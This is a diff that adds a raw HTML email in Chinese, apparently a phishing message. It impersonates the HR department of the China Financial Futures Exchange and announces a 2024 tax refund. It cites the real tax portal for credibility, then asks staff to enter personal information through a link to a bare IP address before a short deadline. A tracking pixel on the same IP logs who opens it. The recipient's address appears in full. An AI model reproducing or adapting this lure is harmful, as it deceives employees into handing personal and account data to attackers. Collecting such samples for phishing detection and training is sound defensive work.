@@ -1,0 +1,163 @@
+Received: from cffexspam01.cffex.com.cn (unknown [172.17.0.199])
+	by front_02 (Coremail) with SMTP id AkAarADxdwah479nnCoAAA--.1410S3;
+	Thu, 27 Feb 2025 12:01:37 +0800 (CST)
+Received: from ptr-hk-43-155-125-195.qcloudmail.com (ptr-hk-43-155-125-195.qcloudmail.com [43.155.125.195] (may be forged))
+	by cffexspam01.cffex.com.cn with ESMTP id 51R40lA5000930
+	for <liym@cffex.com.cn>; Thu, 27 Feb 2025 12:00:47 +0800 (GMT-8)
+	(envelope-from notify@help.fit-tencent.com)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+ s=qcloud; d=help.fit-tencent.com; t=1740628842;
+  h=from:to:subject:content-type:content-transfer-encoding;
+ bh=Ef92MvlOgb4EbhvIyTNksr7b/K8kdA71bp4Ay4AXvqA=;
+ b=b9xQTeEs65qhKAyPhN7SFd2LoXP2+3mw3gap5yvEozyNckcuOMVhukqC1TURvz7trGDSJr
+ +Oh0oAQYQ4l9iCXsY1B2Y7PxEBQob/b/qIvd2pofI9sqNMqCt0H9RGeF3M+Z6wacIVwqBt
+ EO7vciwE5ml3QKAd1iV2JU81MuJ7ADk=
+To: liym@cffex.com.cn
+From: =?UTF-8?b?5Lit6YeR5omA5Lq65Yqb6LWE5rqQ6YOo?= <notify@help.fit-tencent.com>
+Subject: =?UTF-8?q?=E3=80=90=E9=87=8D=E8=A6=81=E3=80=912024=E5=B9=B4=E5=BA=A6?= =?UTF-8?q?=E4=B8=AA=E4=BA=BA=E6=89=80=E5=BE=97=E7=A8=8E=E9=80=80=E7=A8=8E?= =?UTF-8?q?=E9=80=9A=E7=9F=A5?=
+Mime-Version: 1.0
+Date: Thu, 27 Feb 2025 12:00:42 +0800
+Message-Id: <aea222e0765649ce8145f48fc1ed5695.20250227.1740628842@qcloudmail.com>
+Content-Type: multipart/mixed;
+ boundary=cc81d3b97b03dfacdb8a98d3c0d42690663842e08e4d67ad23cdf619a6c6
+X-DKIM-Results: [43.155.125.195];
+	dkim=pass (1024-bit key) () header.d=help.fit-tencent.com; header.i=@help.fit-tencent.com;
+X-DNSRBL: 
+X-SPAM-SOURCE-CHECK: pass
+X-MAIL:cffexspam01.cffex.com.cn 51R40lA5000930
+X-CM-TRANSID:AkAarADxdwah479nnCoAAA--.1410S3
+Authentication-Results: front_02; spf=neutral smtp.mail=notify@help.fi
+	t-tencent.com;
+X-Coremail-Antispam: 1UD129KBjDUn29KB7ZKAUJUUUUU529EdanIXcx71UUUUU7v73
+	VFW2AGmfu7bjvjm3AaLaJ3UjIYCTnIWjDUYxBIdaVFxhVjvjDU0xZFpf9x0zRUUUUUUUUU
+	=
+
+--cc81d3b97b03dfacdb8a98d3c0d42690663842e08e4d67ad23cdf619a6c6
+Content-Type: multipart/alternative;
+ boundary=7380b33f8f4e451779bdcf0692ac792b39980a65e3965398e56282ce4eb7
+
+--7380b33f8f4e451779bdcf0692ac792b39980a65e3965398e56282ce4eb7
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html><html lang=3D"en"><head>
+    <meta charset=3D"UTF-8"/>
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0"/>
+    <title>2024=E5=B9=B4=E5=BA=A6=E4=B8=AA=E4=BA=BA=E6=89=80=E5=BE=97=E7=A8=
+=8E=E9=80=80=E7=A8=8E=E9=80=9A=E7=9F=A5</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            text-align: center;
+            padding: 10px 0;
+            border-radius: 8px 8px 0 0;
+        }
+        .content {
+            padding: 20px;
+        }
+        .content p {
+            margin: 10px 0;
+        }
+        .content a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .content a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: right;
+            padding: 60px 100px;
+            border-radius: 0 0 8px 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class=3D"container">
+        <div class=3D"header">
+            <h1>2024=E5=B9=B4=E5=BA=A6=E4=B8=AA=E4=BA=BA=E6=89=80=E5=BE=97=
+=E7=A8=8E=E9=80=80=E7=A8=8E=E9=80=9A=E7=9F=A5</h1>
+        </div>
+        <div class=3D"content">
+            <p>=E5=90=84=E4=BD=8D=E5=90=8C=E4=BA=8B=EF=BC=9A</p>
+            <p>=C2=A0=C2=A0=C2=A0=C2=A0=E5=A4=A7=E5=AE=B6=E5=A5=BD=EF=BC=81=
+=E9=9A=8F=E7=9D=802024=E5=B9=B4=E5=BA=A6=E7=9A=84=E9=80=80=E7=A8=8E=E5=BC=
+=80=E5=A7=8B=EF=BC=8C=E6=88=91=E4=BB=AC=E9=9C=80=E8=A6=81=E6=8F=90=E9=86=92=
+=E5=A4=A7=E5=AE=B6=E6=9C=89=E5=85=B32024=E5=B9=B4=E5=BA=A6=E4=B8=AA=E4=BA=
+=BA=E6=89=80=E5=BE=97=E7=A8=8E=E9=80=80=E7=A8=8E=E4=BA=8B=E5=AE=9C=E7=9A=84=
+=E6=B5=81=E7=A8=8B:</p>
+            <p>=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A01. =E6=A0=B9=
+=E6=8D=AE=E3=80=8A=E4=B8=AA=E4=BA=BA=E6=89=80=E5=BE=97=E7=A8=8E=E6=B3=95=E3=
+=80=8B=E5=8F=8A=E5=85=B6=E5=AE=9E=E6=96=BD=E6=9D=A1=E4=BE=8B=E3=80=81=E7=A8=
+=8E=E6=94=B6=E5=BE=81=E7=AE=A1=E6=B3=95=E5=8F=8A=E5=85=B6=E5=AE=9E=E6=96=BD=
+=E7=BB=86=E5=88=99=E3=80=81=E5=9B=BD=E5=AE=B6=E7=A8=8E=E5=8A=A1=E6=80=BB=E5=
+=B1=80=E5=85=B3=E4=BA=8E=E5=8A=9E=E7=90=862024=E5=B9=B4=E5=BA=A6=E4=B8=AA=
+=E4=BA=BA=E6=89=80=E5=BE=97=E7=A8=8E=E7=BB=BC=E5=90=88=E6=94=B6=E5=85=A5=E7=
+=BB=93=E7=AE=97=E7=BC=B4=E7=BA=B3=E5=B7=A5=E4=BD=9C=E7=9A=84=E5=85=AC=E5=91=
+=8A=E8=A7=84=E5=AE=9A=EF=BC=8C=E5=91=98=E5=B7=A5=E5=BA=94=E5=9C=A82025=E5=
+=B9=B43=E6=9C=881=E6=97=A5=E8=87=B36=E6=9C=8830=E6=97=A5=E6=9C=9F=E9=97=B4=
+=E5=AE=8C=E6=88=90=E4=B8=AA=E4=BA=BA=E6=89=80=E5=BE=97=E7=A8=8E=E7=9A=84=E7=
+=BB=93=E7=AE=97=E5=92=8C=E7=BC=B4=E7=BA=B3=E3=80=82</p>
+            <p>=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A02. =E4=B8=BA=
+=E4=BA=86=E6=96=B9=E4=BE=BF=E6=AD=A4=E8=BF=87=E7=A8=8B=EF=BC=8C=E5=91=98=E5=
+=B7=A5=E5=8F=AF=E9=80=9A=E8=BF=87=E6=B5=8F=E8=A7=88=E5=99=A8=E7=9B=B4=E6=8E=
+=A5=E7=99=BB=E5=BD=95=E5=AE=98=E6=96=B9=E7=BD=91=E7=AB=99=EF=BC=88<a href=
+=3D"https://12366.chinatax.gov.cn">https://12366.chinatax.gov.cn</a>=EF=BC=
+=89=E8=BF=9B=E8=A1=8C=E9=80=80=E7=A8=8E=E5=92=8C=E6=B8=85=E5=85=B3=E6=93=8D=
+=E4=BD=9C=E3=80=82=E8=AF=B7=E7=A1=AE=E4=BF=9D=E6=89=80=E6=9C=89=E5=BF=85=E8=
+=A6=81=E6=96=87=E4=BB=B6=E5=87=86=E7=A1=AE=E3=80=81=E5=8F=8A=E6=97=B6=E5=9C=
+=B0=E6=8F=90=E4=BA=A4=EF=BC=8C=E4=BB=A5=E9=81=BF=E5=85=8D=E9=80=80=E7=A8=8E=
+=E8=BF=9B=E7=A8=8B=E5=BB=B6=E8=AF=AF=E3=80=82</p>
+            <p>=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A03. =E8=AF=B7=
+=E8=AE=A1=E5=88=92=E9=80=80=E7=A8=8E=E7=94=B3=E6=8A=A5=E7=9A=84=E5=90=8C=E4=
+=BA=8B=E5=9C=A8=E9=A3=9E=E4=B9=A6=E6=94=B6=E9=9B=86=E8=A1=A8=E4=B8=AD=E5=A1=
+=AB=E5=86=99=E8=87=AA=E5=B7=B1=E7=9A=84=E4=B8=AA=E4=BA=BA=E4=BF=A1=E6=81=AF=
+=EF=BC=8C=E6=96=B9=E4=BE=BF=E8=B4=A2=E5=8A=A1=E5=90=8E=E6=9C=9F=E5=B7=A5=E4=
+=BD=9C=EF=BC=9A=E6=94=B6=E9=9B=86=E8=A1=A8=E5=A1=AB=E6=8A=A5=E6=88=AA=E6=AD=
+=A2=E6=97=B6=E9=97=B43=E6=9C=883=E6=97=A518:00 <a href=3D"https://129.226.7=
+4.83?r=3DwyHofeWd">=E7=82=B9=E5=87=BB=E6=AD=A4=E5=A4=84=E5=A1=AB=E5=86=99</=
+a></p>
+            <p>=C2=A0=C2=A0=C2=A0=C2=A0=E6=B3=A8=E6=84=8F=EF=BC=9A12366=E7=
+=BD=91=E7=AB=99=E4=B8=8E=E4=B8=AA=E4=BA=BA=E6=89=80=E5=BE=97=E7=A8=8EAPP=E8=
+=B4=A6=E5=8F=B7=E4=B8=8D=E5=90=8C=E6=AD=A5=EF=BC=8C=E9=9C=80=E8=A6=81=E9=87=
+=8D=E6=96=B0=E6=B3=A8=E5=86=8C=E8=B4=A6=E5=8F=B7=E3=80=82=E9=80=9A=E8=BF=87=
+=E5=AE=98=E7=BD=91=E9=80=80=E7=A8=8E=E6=97=A0=E9=9C=80=E9=A2=84=E7=BA=A6=EF=
+=BC=8C=E9=80=80=E7=A8=8E=E6=B5=81=E7=A8=8B=E8=BE=83=E5=BF=AB=E3=80=82=E5=BB=
+=BA=E8=AE=AE=E4=BD=BF=E7=94=A8=E6=AD=A4=E6=96=B9=E6=B3=95=E8=BF=9B=E8=A1=8C=
+=E9=80=80=E7=A8=8E=EF=BC=8C=E4=BF=AE=E6=94=B9=E9=80=80=E7=A8=8E=E4=BF=A1=E6=
+=81=AF=EF=BC=8C=E6=9F=A5=E7=9C=8B=E9=80=80=E7=A8=8E=E8=BF=9B=E5=BA=A6=EF=BC=
+=8C=E5=A6=82=E6=9C=89=E4=BB=BB=E4=BD=95=E7=96=91=E9=97=AE=E6=88=96=E9=9C=80=
+=E8=A6=81=E5=8D=8F=E5=8A=A9=EF=BC=8C=E8=AF=B7=E9=9A=8F=E6=97=B6=E8=81=94=E7=
+=B3=BB=E4=BA=BA=E5=8A=9B=E8=B5=84=E6=BA=90=E9=83=A8(HR)=E3=80=82=E6=84=9F=
+=E8=B0=A2=E5=90=84=E4=BD=8D=E7=9A=84=E5=90=88=E4=BD=9C=E5=92=8C=E5=85=B3=E6=
+=B3=A8</p>
+        </div>
+        <div class=3D"footer">
+            <p>=E4=B8=AD=E9=87=91=E6=89=80=E4=BA=BA=E5=8A=9B=E8=B5=84=E6=BA=
+=90=E9=83=A8</p>
+            <p>2025=E5=B9=B42=E6=9C=8827=E6=97=A5</p>
+        </div>
+    </div>
+<img style=3D"width:1px,height:1px" alt=3D"" src=3D"https://129.226.74.83/v=
+iew?r=3DwyHofeWd"/>
+
+</body></html>=
+
+--7380b33f8f4e451779bdcf0692ac792b39980a65e3965398e56282ce4eb7--
+
+--cc81d3b97b03dfacdb8a98d3c0d42690663842e08e4d67ad23cdf619a6c6--
